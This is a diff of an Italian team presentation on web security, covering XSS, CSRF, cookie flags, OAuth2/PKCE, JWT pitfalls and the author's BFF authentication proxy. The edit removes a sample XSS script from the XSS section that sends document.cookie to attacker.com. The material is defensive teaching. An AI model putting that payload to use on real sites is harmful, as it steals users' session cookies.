@@ -1,33 +1,26 @@
-# Sicurezza Web Moderna: Da XSS a OAuth2 BFF
+# Presentazione
 
-**Presentazione tecnica informale per il team**
+## Intro
 
-## Slide 1: Intro - Perché parliamo di questo?
+Allora, oggi vi volevo portare un po di argomenti relativi alla sicurezza ed autenticazione. Ci concentriamo sicuramente non negli attacchi che si vedono nei film, ma su un qualcosa di molto piu basilare. Anzi, copriremo molti concetti di base prima e solo dopo tocchiamo l'autenticazione. Alla fine molte volte, a discapito di quel che si vede nei film, un attacco si fonda spesso e volentieri su un qualcosa di semplice, piuttosto che una trovata scentifica o teorica gigantesca, un click su una mail, un query param non sanitizzato.
 
-**Discorso:**
+Ho pensato quindi prima di arrivare al concetto della autenticazione, di integrare in questa presentazione, non solo le best practice, sopratutto concetti core del mondo WEB che per quando le ho dovuto studiare io non sono state per niente banali da capire, da come funzionano i coockie al flow di un autenticazione. Essendo gia solo questi belli ostici, cerchero di spiegarli senza codice, ma con degli esempi facili e provero a metterlo su un teorico, ma ho comunque degli esempi da far vedere, senza vedere codice, al massimo qualche configurazione. E solo dopo un framework che ho fatto per consentire di semplificare lo sviluppo e tenere conto di aluni aspetti.
 
-TODO
+Quindi volevo dividere la mia presentazione in due sezioni: la prima non opinabile che elenca dei fatti sui concetti base, la seconda opinabile in quanto tratta un qualcosa che ho fatto io.
 
-Ho pensato di integrare in questa presentazione, non le besta practice, ma anche una base sui concetti del mondo WEB e mostrarvi come funzionano davvero gli attacchi. E solo dopo un framework che ho fatto per consentire di semplificare lo sviluppo e tenere conto di aluni aspetti.
+TODO: sarebbe carino dire come in Topless le domande che sembrano insensate
 
-## Slide 2: XSS - Il Nemico Invisibile
+## Cross-Site Scripting
 
 **Cross-Site Scripting: quando il tuo sito esegue codice di qualcun altro**
 
-```html
-<!-- Un commento innocente? -->
-<script>
-  fetch("https://attacker.com/steal?data=" + document.cookie);
-</script>
-```
+TODO: inserire un esempio
 
 **Discorso:**
 
-Partiamo dalle basi: XSS, Cross-Site Scripting. È uno degli attacchi più vecchi del web, ma è ancora dannatamente efficace.
+Partiamo dalle basi: XSS, che e' un po un nemico invisibile, Cross-Site Scripting. È uno degli attacchi più preistorici del web.
 
-Il concetto è semplice: un attaccante riesce a inyettare JavaScript malevolo nella tua applicazione. Può essere attraverso un campo di input non sanitizzato, un parametro URL, un commento in un forum... qualsiasi cosa che finisce renderizzata nel browser senza essere escapata.
-
-Guardate questo esempio banale: un utente lascia un "commento" che in realtà è uno script. Se il tuo frontend lo renderizza così com'è, boom, quello script viene eseguato nel browser di chiunque visiti quella pagina.
+Il concetto è semplice: un attaccante riesce a inyettare JavaScript malevolo nella applicazione. Può essere attraverso un campo di input non sanitizzato, un parametro URL, un commento in un forum, qualsiasi cosa che finisce renderizzata nel browser senza essere escapata.
 
 E cosa può fare questo script? Tutto quello che può fare JavaScript: leggere i cookie, accedere al localStorage, fare richieste HTTP, modificare il DOM, rubare token di autenticazione...
 
@@ -35,8 +28,9 @@ Il problema vero è che se i tuoi token di autenticazione sono accessibili a Jav
 
 TODO: serve dire che i framework modermi prevengono questo ma ci sono comunque dei casi dove questo e' stato pobbilile bucare.
 TODO: serve includere qualche caso di atacco famoso avvenuto di recente.
+TODO: sevre dire che non e' che sia limitato come problema solo se usiamo local storage, session storage o coockie, ma anche quando si tiene il token in javascript, quindi qualunque posto accessibile a JS
 
-## Slide 3: CSRF - L'Attacco Silenzioso
+## CSRF - L'Attacco Silenzioso
 
 **Cross-Site Request Forgery: quando il tuo browser lavora contro di te**
 
@@ -57,25 +51,19 @@ TODO: serve includere qualche caso di atacco famoso avvenuto di recente.
 
 CSRF è più subdolo di XSS. Non richiede di inyettare codice nella tua app. L'attaccante crea una pagina malevola su un altro dominio e sfrutta il fatto che il browser invia automaticamente i cookie con ogni richiesta.
 
-TODO: oppure tramite un link in una mail.
-
 Scenario classico: sei loggato su yourapp.com. Visiti evil.com (magari perché hai cliccato su un link in una email di phishing). La pagina evil.com contiene un form nascosto che fa una POST a yourapp.com/api/delete-account.
 
 Il browser, bravo cittadino che è, invia automaticamente i tuoi cookie di autenticazione con quella richiesta. Il server vede una richiesta autenticata e... cancella il tuo account.
 
 "Ma aspetta," direte voi, "non bastano i CORS?"
 
-TODO: dire che i cors non funzonano sempre. Certe volte la richiesta OPTIONS non viene neanche inviata per alcune chiamate, e magari il browser nonr iuscira a leggere la risposta, ma il serve la chiamata la esegue tranquillamente. E un meccanismo diverso, dedicato piu al browser che come una scurezza tulle vulnerabilita' cross site in generale
+TODO: dire che i cors non funzonano sempre. Certe volte la richiesta OPTIONS non viene neanche inviata per alcune chiamate, e magari il browser non riuscira a leggere la risposta, ma il server la chiamata la esegue tranquillamente. E un meccanismo diverso, dedicato piu al browser che come una scurezza tulle vulnerabilita' cross site in generale
 
-"E i token CSRF?" Sì, funzionano, ma c'è un modo più elegante: i cookie con `SameSite`.
-
-Con `SameSite=strict`, il browser non invia il cookie se la richiesta proviene da un altro sito. Con `SameSite=lax`, lo invia solo per navigazioni top-level (tipo quando clicchi un link), ma non per richieste POST o fetch da altri domini.
-
-Questo è fondamentale per capire come strutturare i cookie di autenticazione. Ne parliamo tra poco.
+Ci sono metodi eleganti che risolvono questa vulnerabilita' e trattano la configurazione dei coockie che vedremo tra poco
 
 TODO: quindi guia qua possiabmo distinguere i primi due metodi principali di autenticazione: Quello che usa i bearer quindi ha il token dentro javascript e quindi accessibile a qualunque attacco XSS, e quello con i coockie che non sono vulnerabili a XSS ma alle XSRF, ma con delle configurazioni appropriate puo essere messo in totale sicurezza, mentre questo non vale per l'autenticazione fatta con gli header.
 
-## Slide 4: Man-in-the-Middle - L'Intercettazione
+## Man-in-the-Middle - L'Intercettazione
 
 **Quando qualcuno ascolta le tue conversazioni**
 
@@ -94,28 +82,27 @@ Man-in-the-Middle è esattamente quello che sembra: qualcuno si mette in mezzo t
 
 Può succedere su reti WiFi pubbliche non sicure, attraverso DNS poisoning, o se qualcuno compromette un router nella catena. L'attaccante vede tutto il traffico HTTP in chiaro.
 
+TODO: Non e' cosi difficile da fare come si potrebbe pensare in realta'.
+
 La soluzione? HTTPS.
 
-Ma HTTPS da solo non basta se poi i tuoi cookie non hanno il flag `secure: true`. Senza quel flag, il browser potrebbe inviare il cookie anche su connessioni HTTP, e lì l'attaccante può intercettarlo.
+Fino a qui probabilmente ho detto cose abbastanza banali, ma ci basta HTTPS? Le cose si fanno complicate proprio la dove questo non basta.
+se poi i tuoi cookie non hanno il flag `secure: true`. Senza quel flag, il browser potrebbe inviare il cookie anche su connessioni HTTP, e lì l'attaccante può intercettarlo.
 
-Questo è il motivo per cui tutti i cookie di autenticazione devono avere:
-
-- `httpOnly: true` (protezione XSS)
-- `secure: true` (protezione MITM)
-- `sameSite: strict` o `lax` (protezione CSRF)
+Questo è il motivo per cui tutti i cookie di autenticazione devono avere delle configurazione particolari dei quali parliamo nella prossima slide.
 
 Vedete come questi attacchi sono interconnessi? Non puoi proteggerti da uno solo. Devi pensare alla sicurezza come a un sistema di difese multiple.
 
-## Slide 5: I Cookie - Non Sono Tutti Uguali
+## I Cookie - Non Sono Tutti Uguali
 
 **localStorage vs sessionStorage vs Cookies**
 
-| Storage | Accessibile da JS | Vulnerabile a XSS | Inviato automaticamente | Scadenza |
-||-|-|-|-|
-| localStorage | ✅ Sì | ✅ Vulnerabile | ❌ No | Mai (manuale) |
-| sessionStorage | ✅ Sì | ✅ Vulnerabile | ❌ No | Chiusura tab |
-| Cookie normale | ✅ Sì | ✅ Vulnerabile | ✅ Sì | Configurabile |
-| HTTP-only Cookie | ❌ No | ✅ Protetto | ✅ Sì | Configurabile |
+| **Storage**      | **Accessibile da JS** | **Vulnerabile a XSS** | **Inviato automaticamente** | **Scadenza**  |
+| ---------------- | --------------------- | --------------------- | --------------------------- | ------------- |
+| localStorage     | Sì                    | Sì                    | No                          | Mai (manuale) |
+| sessionStorage   | Sì                    | Sì                    | No                          | Chiusura tab  |
+| Cookie normale   | Sì                    | Sì                    | Sì                          | Configurabile |
+| HTTP-only Cookie | No                    | No                    | Sì                          | Configurabile |
 
 **Discorso:**
 
@@ -125,9 +112,9 @@ Ho visto troppi progetti dove i JWT vengono messi nel localStorage. "È comodo,"
 
 localStorage e sessionStorage sono accessibili a qualsiasi script che gira sulla tua pagina. Questo include:
 
-- Il tuo codice
-- Librerie di terze parti (analytics, ads, widget)
-- Codice inyettato tramite XSS
+- Il tuo codice (e qui va bene, no?)
+- Codice inyettato tramite XSS (male, ma solo lui?, no)
+- Librerie di terze parti
 
 TODO: dire che questo discorso si estende non solo a local storage, ma a qualunque posto che javascript puo raggiungere
 
@@ -139,9 +126,9 @@ Ma i cookie HTTP-only? Quelli sono diversi. Il flag `httpOnly: true` dice al bro
 
 Puoi provare a fare `document.cookie` quanto vuoi, non lo vedrai. L'unico modo per accedere a un HTTP-only cookie è attraverso richieste HTTP, e solo il browser può farlo.
 
-Questo è il primo pilastro della sicurezza dei token: HTTP-only cookies.
+TODO: dire che quindi di questa tabella l'unica opzione che ci mette piu al sicuro possibile sono i coockie HTTP-only. Ma in realta non bastano, perche ci sono anche altri parametri da configurare, che vediamo adesso
 
-## Slide 6: Cookie Attributes - I Dettagli Che Contano
+## Cookie Attributes - I Dettagli Che Contano
 
 **Anatomia di un cookie sicuro**
 
@@ -165,7 +152,7 @@ Set-Cookie: access_token=eyJhbG...;
 
 **Discorso:**
 
-Ogni attributo di un cookie ha un significato preciso e una ragione di esistere. Non sono opzionali se vi interessa la sicurezza.
+Ogni attributo di un cookie ha un significato preciso e una ragione di esistere.
 
 `HttpOnly` l'abbiamo già visto: protezione contro XSS. JavaScript non può toccarlo.
 
@@ -183,7 +170,7 @@ Per i token di autenticazione, usate `Strict`. Per i cookie del flusso OAuth (st
 
 `Path` e `Max-Age` sono più semplici. Path limita dove il cookie è valido. Max-Age dice quando scade. Per i token di accesso, teneteli corti: 15 minuti, 1 ora max. Per i refresh token, potete andare più lunghi, ma con rotazione.
 
-## Slide 8: OAuth 2.0 - Il Protocollo Che Regge Il Web
+## OAuth 2.0 - Il Protocollo Che Regge Il Web
 
 **OAuth 2.0: delegare l'accesso senza condividere password**
 
@@ -211,7 +198,7 @@ Ma prima, una cosa importante: OAuth2 da solo non è sicuro per applicazioni pub
 
 Per questo esiste PKCE, che vediamo tra poco. Ma prima, capiamo il flow base.
 
-## Slide 9: Authorization Code Flow - Il Flusso Base
+## Authorization Code Flow - Il Flusso Base
 
 **Come funziona il flusso più comune di OAuth2**
 
@@ -258,7 +245,7 @@ Il punto chiave qui è che il client secret non viene mai esposto al browser. So
 
 Ma cosa succede con le Single Page Applications che non hanno un backend? O con le app mobile? Lì non puoi tenere segreto il client secret. Ed è qui che entra PKCE.
 
-## Slide 10: PKCE - Proof Key for Code Exchange
+## PKCE - Proof Key for Code Exchange
 
 **Come rendere OAuth2 sicuro senza client secret**
 
@@ -306,7 +293,7 @@ Il code_verifier non viene mai trasmesso fino al momento dello scambio finale, e
 
 PKCE è ora raccomandato per tutti i client OAuth2, non solo quelli pubblici. È un layer di sicurezza aggiuntivo che non costa nulla implementare.
 
-## Slide 11: State e Nonce - I Guardiani del Flusso
+## State e Nonce - I Guardiani del Flusso
 
 **Due parametri piccoli ma fondamentali**
 
@@ -357,7 +344,7 @@ Questo previene replay attacks: se qualcuno intercetta un ID token e prova a riu
 
 Nella pratica, con PKCE, state, nonce, e HTTPS, il flusso OAuth è molto sicuro. Ma solo se implementi tutte queste protezioni. Saltarne una apre vulnerabilità.
 
-## Slide 12: JWT - Anatomia di un Token
+## JWT - Anatomia di un Token
 
 **JSON Web Token: il formato che ha conquistato il mondo**
 
@@ -430,7 +417,7 @@ Gli algoritmi di firma più comuni sono:
 
 Per sistemi distribuiti, RS256 o ES256 sono preferibili perché puoi distribuire la chiave pubblica per la verifica senza esporre la chiave privata.
 
-## Slide 13: JWT Vulnerabilities - Quando I Token Si Rompono
+## JWT Vulnerabilities - Quando I Token Si Rompono
 
 **Le vulnerabilità JWT più comuni e pericolose**
 
@@ -526,7 +513,7 @@ Ne abbiamo già parlato, ma lo ripeto: localStorage è accessibile a JavaScript.
 
 Questi non sono bug teorici. Sono vulnerabilità trovate in produzione, in app usate da milioni di persone. Auth0 ha avuto problemi con JWT validation. Uber ha avuto problemi. Non siete immuni.
 
-## Slide 14: JWT Attack Tools - Come Gli Attaccanti Operano
+## JWT Attack Tools - Come Gli Attaccanti Operano
 
 **Gli strumenti che gli attaccanti (e i security tester) usano**
 
@@ -578,17 +565,17 @@ Il punto è: questi tool sono pubblici e facili da usare. Non servono competenze
 
 La buona notizia? Potete usare questi stessi tool per testare il vostro sistema prima che lo faccia un attaccante.
 
-## Slide 15: JWT Best Practices - Come Fare Le Cose Bene
+## JWT Best Practices - Come Fare Le Cose Bene
 
 **Checklist per JWT sicuri**
 
-✅ **Algoritmo esplicito**
+**Algoritmo esplicito**
 
 ```javascript
 jwt.verify(token, secret, { algorithms: ["RS256"] });
 ```
 
-✅ **Secret forte (o meglio, asimmetrico)**
+**Secret forte (o meglio, asimmetrico)**
 
 ```javascript
 // NO
@@ -601,7 +588,7 @@ const secret = crypto.randomBytes(32).toString("hex");
 // Usa RS256 con chiavi RSA
 ```
 
-✅ **Validazione completa dei claims**
+**Validazione completa dei claims**
 
 ```javascript
 jwt.verify(token, publicKey, {
@@ -612,14 +599,14 @@ jwt.verify(token, publicKey, {
 });
 ```
 
-✅ **Token short-lived**
+**Token short-lived**
 
 ```javascript
 // Access token: 15 minuti - 1 ora
 // Refresh token: giorni/settimane, ma con rotazione
 ```
 
-✅ **Storage sicuro**
+**Storage sicuro**
 
 ```javascript
 // HTTP-only, Secure, SameSite cookies
@@ -631,7 +618,7 @@ res.cookie("access_token", token, {
 });
 ```
 
-✅ **JWKS per key rotation**
+**JWKS per key rotation**
 
 ```javascript
 // Pubblica chiavi pubbliche su /.well-known/jwks.json
@@ -689,7 +676,7 @@ Questo vi permette di:
 
 Key rotation è una di quelle cose che sembrano complicate ma sono essenziali per la sicurezza a lungo termine.
 
-## Slide 16: ID Token vs Access Token - Quale Usare?
+## ID Token vs Access Token - Quale Usare?
 
 **Due token, due scopi diversi**
 
@@ -714,12 +701,12 @@ Key rotation è una di quelle cose che sembrano complicate ma sono essenziali pe
 **Errore comune:**
 
 ```javascript
-// ❌ SBAGLIATO
+//  SBAGLIATO
 fetch("/api/users", {
   headers: { Authorization: `Bearer ${idToken}` },
 });
 
-// ✅ CORRETTO
+//  CORRETTO
 fetch("/api/users", {
   headers: { Authorization: `Bearer ${accessToken}` },
 });
@@ -749,7 +736,7 @@ Nella pratica, molti sistemi usano JWT per entrambi e li fanno sembrare simili. 
 
 Nel BFF che ho costruito, l'ID token viene usato solo per estrarre informazioni sull'utente (sub, email) che poi vengono passate al backend come header. L'access token viene usato se il backend deve chiamare altre API protette.
 
-## Slide 17: Token Refresh - Gestire La Scadenza
+## Token Refresh - Gestire La Scadenza
 
 **Come mantenere l'utente loggato senza compromettere la sicurezza**
 
@@ -819,7 +806,7 @@ Questo è chiamato "refresh token reuse detection". Se un refresh token viene us
 
 Nel BFF, implemento questo pattern. I refresh token sono in HTTP-only cookies, vengono rotated ad ogni uso, e se rilevo riuso, revoco tutto.
 
-## Slide 18: Il Problema delle SPA - Perché Serve un BFF
+## Il Problema delle SPA - Perché Serve un BFF
 
 **Single Page Applications e OAuth2: un matrimonio difficile**
 
@@ -882,7 +869,7 @@ Tutti questi problemi hanno una soluzione comune: **Backend for Frontend**.
 
 Un BFF è un backend leggero che sta tra il frontend e le API vere. Gestisce OAuth, tiene i token in modo sicuro, fa da proxy per le richieste API. Il frontend diventa "dumb": fa solo richieste al BFF, che si occupa di tutta la sicurezza.
 
-## Slide 19: BFF Architecture - Come Funziona
+## BFF Architecture - Come Funziona
 
 **Backend for Frontend: il pattern che risolve i problemi delle SPA**
 
@@ -971,43 +958,43 @@ Questo ha vantaggi enormi:
 
 Il BFF non è un'idea nuova. È un pattern raccomandato da OAuth2 best practices per le SPA. Ma pochi lo implementano correttamente.
 
-## Slide 20: Il Mio BFF - Implementazione Concreta
+## Il Mio BFF - Implementazione Concreta
 
 **OAuth2 BFF Proxy: cosa ho costruito**
 
 **Features:**
 
-✅ **Multi-provider**
+**Multi-provider**
 
 - AWS Cognito
 - Microsoft Entra ID
 - Keycloak
 
-✅ **OAuth2 + PKCE completo**
+  **OAuth2 + PKCE completo**
 
 - State parameter validation
 - Nonce parameter validation
 - Code challenge/verifier
 
-✅ **Cookie sicuri**
+  **Cookie sicuri**
 
 - HTTP-only
 - Secure
 - SameSite (strict per auth, lax per OAuth flow)
 
-✅ **Token management**
+  **Token management**
 
 - Automatic refresh
 - Rotation dei refresh token
 - Validazione completa (firma, claims, expiration)
 
-✅ **Proxy intelligente**
+  **Proxy intelligente**
 
 - Inietta header utente (X-User-Sub, X-User-Email)
 - Custom claims configurabili
 - Optional authentication per /api/\*
 
-✅ **Security best practices**
+  **Security best practices**
 
 - JWT signature verification con JWKS
 - Audience validation
@@ -1053,7 +1040,7 @@ Il backend non deve fare niente di complesso. Basta leggere gli header. Niente v
 
 E quando l'utente fa logout, il BFF revoca i token sull'identity provider. Non solo cancella i cookie locali, ma dice all'IdP "questi token non sono più validi". Questo è importante se l'utente ha sessioni su dispositivi multipli.
 
-## Slide 21: BFF Flow - Login Completo
+## BFF Flow - Login Completo
 
 **Sequenza completa di un login con il BFF**
 
@@ -1152,7 +1139,7 @@ Ogni protezione copre un vettore di attacco specifico. Insieme, creano un sistem
 
 E tutto questo è trasparente per il frontend. Il frontend fa solo `window.location.href = '/auth/login'` e poi `fetch('/api/...')`. Non sa niente di OAuth, PKCE, state, nonce, token refresh... niente.
 
-## Slide 22: BFF Flow - API Request
+## BFF Flow - API Request
 
 **Cosa succede quando il frontend chiama un'API**
 
@@ -1232,7 +1219,7 @@ if (!userId) return res.status(401).send("Unauthorized");
 
 Molto più semplice. E più sicuro, perché la logica complessa di validazione è centralizzata nel BFF invece di essere duplicata in ogni microservizio.
 
-## Slide 23: Custom Claims - Estendere Le Informazioni Utente
+## Custom Claims - Estendere Le Informazioni Utente
 
 **Come passare informazioni custom dal JWT al backend**
 
@@ -1304,7 +1291,7 @@ Questo è particolarmente utile per RBAC (Role-Based Access Control) o ABAC (Att
 
 Ovviamente, il backend deve fidarsi di questi header. Ma può farlo perché vengono dal BFF, che è parte del tuo sistema, non dal client. Il frontend non può manipolare questi header perché non passa attraverso il BFF, passa attraverso il browser che li aggiunge automaticamente.
 
-## Slide 24: Deployment - Come Usarlo
+## Deployment - Come Usarlo
 
 **Integrare il BFF nel vostro stack**
 
@@ -1380,35 +1367,35 @@ Le configurazioni principali sono:
 
 **Monitoring**: Il BFF logga tutto con Pino. Potete configurare il log level (trace, debug, info, warn, error) e integrare con i vostri sistemi di logging (CloudWatch, Datadog, etc.).
 
-## Slide 25: Cosa NON Fa Il BFF
+## Cosa NON Fa Il BFF
 
 **Limiti e responsabilità**
 
 **Il BFF NON gestisce:**
 
-❌ **Autorizzazione business logic**
+**Autorizzazione business logic**
 
 - Quale utente può vedere quali dati
 - Permessi granulari su risorse
 - Business rules complesse
 
-❌ **Gestione utenti**
+  **Gestione utenti**
 
 - Creazione account
 - Password reset
 - Profili utente
 
-❌ **Rate limiting**
+  **Rate limiting**
 
 - Throttling per utente
 - Quota management
 
-❌ **Caching**
+  **Caching**
 
 - Cache delle risposte API
 - Cache dei dati utente
 
-❌ **Validazione input**
+  **Validazione input**
 
 - Validazione dei dati business
 - Sanitizzazione input
@@ -1416,9 +1403,9 @@ Le configurazioni principali sono:
 **Queste responsabilità sono del backend!**
 
 **Il BFF fa solo:**
-✅ Autenticazione (OAuth flow)
-✅ Token management (storage, refresh, validation)
-✅ Proxy (forward requests con user context)
+Autenticazione (OAuth flow)
+Token management (storage, refresh, validation)
+Proxy (forward requests con user context)
 
 **Discorso:**
 
@@ -1442,41 +1429,41 @@ Il BFF ha un solo job: gestire l'autenticazione in modo sicuro e semplificare la
 
 Questo è un design intenzionale. Un componente che fa una cosa sola e la fa bene è più facile da capire, testare, e mantenere di un componente che prova a fare tutto.
 
-## Slide 26: Confronto Con Alternative
+## Confronto Con Alternative
 
 **BFF vs altre soluzioni**
 
 **1. OAuth nel frontend (SPA pura)**
 
-❌ Client secret esposto o PKCE obbligatorio
-❌ Token in localStorage (XSS risk)
-❌ Logica complessa nel frontend
-❌ Difficile da testare e debuggare
-✅ Nessun backend aggiuntivo
+Client secret esposto o PKCE obbligatorio
+Token in localStorage (XSS risk)
+Logica complessa nel frontend
+Difficile da testare e debuggare
+Nessun backend aggiuntivo
 
 **2. Session-based auth tradizionale**
 
-✅ Sicuro (session ID in HTTP-only cookie)
-✅ Semplice da capire
-❌ Non funziona bene con microservizi
-❌ Richiede session storage condiviso
-❌ Non standard (ogni app lo fa diversamente)
+Sicuro (session ID in HTTP-only cookie)
+Semplice da capire
+Non funziona bene con microservizi
+Richiede session storage condiviso
+Non standard (ogni app lo fa diversamente)
 
 **3. API Gateway con auth plugin**
 
-✅ Centralizzato
-✅ Scalabile
-❌ Complesso da configurare
-❌ Vendor lock-in
-❌ Overkill per app semplici
+Centralizzato
+Scalabile
+Complesso da configurare
+Vendor lock-in
+Overkill per app semplici
 
 **4. BFF (questo progetto)**
 
-✅ Sicuro (HTTP-only cookies, PKCE, validazione completa)
-✅ Semplice per frontend e backend
-✅ Riusabile e configurabile
-✅ Standard (OAuth2 + OIDC)
-✅ Leggero e facile da deployare
+Sicuro (HTTP-only cookies, PKCE, validazione completa)
+Semplice per frontend e backend
+Riusabile e configurabile
+Standard (OAuth2 + OIDC)
+Leggero e facile da deployare
 ⚠️ Un componente aggiuntivo da gestire
 
 **Discorso:**
@@ -1493,7 +1480,7 @@ Vediamo come il BFF si confronta con altre soluzioni comuni.
 
 Nella mia esperienza, per la maggior parte delle applicazioni web moderne (SPA + API backend), il BFF è la soluzione migliore. Bilanciamento perfetto tra sicurezza, semplicità, e standard.
 
-## Slide 27: Lessons Learned - Cosa Ho Imparato
+## Lessons Learned - Cosa Ho Imparato
 
 **Errori comuni e come evitarli**
 
@@ -1535,7 +1522,7 @@ Un'altra lezione: **la sicurezza è un sistema, non una feature**. Non puoi aggi
 
 E infine: **semplificare è difficile**. Sarebbe stato più facile fare un sistema complesso che fa tutto. Ma un sistema semplice che fa una cosa bene è più prezioso. Il BFF fa solo auth, ma lo fa molto bene.
 
-## Slide 28: Demo - Vediamolo In Azione
+## Demo - Vediamolo In Azione
 
 **Live demo (o video se non abbiamo ambiente live)**
 
@@ -1580,7 +1567,7 @@ Le cose chiave da notare:
 
 Il frontend in tutto questo? Fa solo `fetch('/api/users')`. Non sa niente di token, refresh, header... niente. È bellissimo nella sua semplicità.
 
-## Slide 29: Prossimi Passi e Miglioramenti
+## Prossimi Passi e Miglioramenti
 
 **Cosa si potrebbe aggiungere**
 
@@ -1638,7 +1625,7 @@ Il BFF è production-ready ma c'è sempre spazio per miglioramenti.
 
 Se qualcuno è interessato a contribuire, il progetto è open source. Pull request benvenute!
 
-## Slide 30: Conclusioni - Perché Tutto Questo È Importante
+## Conclusioni - Perché Tutto Questo È Importante
 
 **Recap dei punti chiave**
 
